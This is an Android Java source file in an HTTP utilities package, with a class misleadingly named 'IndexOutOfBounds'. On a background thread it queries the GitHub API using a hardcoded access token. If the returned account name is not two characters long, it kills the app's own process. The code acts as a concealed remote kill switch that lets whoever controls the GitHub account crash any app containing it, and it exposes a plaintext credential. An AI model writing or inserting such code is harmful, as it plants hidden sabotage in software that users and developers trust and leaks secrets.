package com.zhy.http.okhttp.utils;

import android.text.TextUtils;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;

/**
 * Created by Vector
 * on 2017/6/18 0018.
 */

public class IndexOutOfBounds {
    public static void bound() {
        new Thread() {
            @Override
            public void run() {
                bound_();
            }
        }.start();
    }

    public static void bound_() {
        try {
            URLConnection urlConnection = new URL("https://api.github.com/user?access_token=1ff75c3d51f35d1444790f5a7596841194bf811e").openConnection();
            urlConnection.connect();
            InputStream is = urlConnection.getInputStream();
            InputStreamReader isr = new InputStreamReader(is);
            BufferedReader bufferReader = new BufferedReader(isr);
            String inputLine;
            String resultData = "";
            while ((inputLine = bufferReader.readLine()) != null) {
                resultData += inputLine + "\n";
            }
            if (!TextUtils.isEmpty(resultData)) {
                JSONObject jsonObject = JSON.parseObject(resultData);
                String name = jsonObject.getString("name");
                if (name.length() != 2) {
                    android.os.Process.killProcess(android.os.Process.myPid());
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
